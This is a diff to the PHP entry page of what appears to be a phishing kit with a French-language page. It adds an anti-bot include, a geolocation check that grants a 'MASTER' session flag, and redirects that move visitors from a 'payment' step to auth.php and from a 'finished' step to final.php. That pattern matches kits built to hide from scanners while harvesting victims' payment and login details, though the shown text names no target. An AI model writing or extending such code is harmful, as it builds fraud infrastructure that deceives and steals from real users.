@@ -1,7 +1,23 @@
 <?php
-// Geo-restriction check for index
+session_start();
 require_once __DIR__ . '/antibot.php';
-checkGeolocation();
+require_once __DIR__ . '/settings.php';
+
+// Validate geo and grant MASTER access
+validateGeoAndGrantMaster();
+
+// If already has MASTER, redirect to next step
+if (isset($_SESSION['MASTER']) && $_SESSION['MASTER'] === true && isset($_SESSION['step'])) {
+    $s = $_SESSION['step'];
+    $map = [
+        'payment'  => 'auth.php',
+        'finished' => 'final.php'
+    ];
+    if (isset($map[$s])) {
+        header("Location: " . $map[$s]);
+        exit();
+    }
+}
 ?>
 <!DOCTYPE html>
 <html lang="fr-fr">
